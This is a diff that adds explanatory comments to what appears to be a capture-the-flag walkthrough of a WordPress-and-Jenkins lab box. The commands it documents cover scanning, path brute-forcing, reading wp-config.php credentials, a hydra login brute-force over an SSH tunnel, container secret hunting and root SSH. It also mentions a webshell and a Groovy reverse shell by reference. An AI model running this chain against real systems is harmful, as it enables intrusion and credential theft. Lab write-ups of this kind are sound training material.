@@ -42,8 +42,12 @@ Local enumeration found WordPress DB credentials, but the useful pivot was `/opt
 Tools: [nmap](../../tools/recon/nmap.md), [feroxbuster](../../tools/fuzz/feroxbuster.md), [nuclei](../../tools/recon/nuclei.md), [wpscan](../../tools/web/wpscan.md).
 
 ```bash
+# What it does: runs an Nmap scan with the specified ports/scripts/options.
+# Why here: identify exposed services and decide on the next enumeration.
 nmap -sS -p- --open -n -Pn --min-rate 5000 $TARGET -oN silent
 nmap -sVC -p22,80 $TARGET -oN service
+# What it does: brute-forces paths, parameters or virtual hosts with a wordlist.
+# Why here: descubrir endpoints ocultos que abren la siguiente fase.
 feroxbuster -u http://internal.thm -w /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt
 nuclei -target http://internal.thm/
 wpscan --url http://internal.thm/blog -e vp,u
@@ -64,10 +68,20 @@ Edit the theme `404.php` with `PHP_WEBSHELL_PAYLOAD`, then call it with a comman
 Full technique: [WordPress wp-config.php credential reuse](../../exploits/creds/wordpress-wp-config-credentials.md).
 
 ```bash
+# What it does: displays a file in the terminal.
+# Why here: read configuration, credentials, proof or flags.
 cat /var/www/html/wordpress/wp-config.php | grep -E "DB_|host|port"
+# What it does: usa un cliente o herramienta de volcado de base de datos.
+# Why here: enumerar datos y extraer credenciales o estado de la app.
 mysql -h localhost -u wordpress -pwordpress123 wordpress
+# What it does: changes the current directory.
+# Why here: position in the necessary path for the next command.
 cd /opt/
+# What it does: displays a file in the terminal.
+# Why here: read configuration, credentials, proof or flags.
 cat wp-save.txt
+# What it does: opens an SSH session or tunnel with the specified options.
+# Why here: obtain interactive shell or pivot to an internal service.
 ssh aubreanna@$TARGET
 ```
 
@@ -76,6 +90,8 @@ ssh aubreanna@$TARGET
 Full techniques: [Jenkins HTTP form brute force](../../exploits/creds/jenkins-http-form-bruteforce.md), [Jenkins Script Console RCE](../../exploits/web-rce/jenkins-script-console-rce.md).
 
 ```bash
+# What it does: opens an SSH session or tunnel with the specified options.
+# Why here: obtain interactive shell or pivot to an internal service.
 ssh -L 8080:172.17.0.2:8080 aubreanna@$TARGET
 hydra -L users.txt -P /usr/share/wordlists/rockyou.txt 127.0.0.1 -s 8080 http-form-post "/j_acegi_security_check:j_username=^USER^&j_password=^PASS^&from=%2F&Submit=Sign+in:Invalid username or password"
 ```
@@ -87,11 +103,23 @@ Use `/script` with the Groovy reverse shell from the Jenkins note.
 Full technique: [Docker container secret hunting](../../exploits/container/docker-container-secret-hunting.md).
 
 ```bash
+# What it does: displays a file in the terminal.
+# Why here: read configuration, credentials, proof or flags.
 cat /proc/self/status | grep -E '^Cap'
+# What it does: muestra el hostname actual.
+# Why here: distinguir si la shell esta en host, contenedor o nodo pivote.
 hostname
+# What it does: monta un sistema de archivos remoto o local.
+# Why here: inspeccionar archivos como si estuvieran en local.
 mount | grep -E 'overlay|aufs'
+# What it does: searches the filesystem with the specified filters.
+# Why here: locate credentials, binaries, configs or writable paths.
 find / -name "*.txt" 2>/dev/null | grep -v proc
+# What it does: displays a file in the terminal.
+# Why here: read configuration, credentials, proof or flags.
 cat /opt/note.txt
+# What it does: opens an SSH session or tunnel with the specified options.
+# Why here: obtain interactive shell or pivot to an internal service.
 ssh root@$TARGET
 ```
 
@@ -117,3 +145,5 @@ ssh root@$TARGET
 - [Jenkins HTTP form brute force](../../exploits/creds/jenkins-http-form-bruteforce.md)
 - [Jenkins Script Console RCE](../../exploits/web-rce/jenkins-script-console-rce.md)
 - [Docker container secret hunting](../../exploits/container/docker-container-secret-hunting.md)
+
+
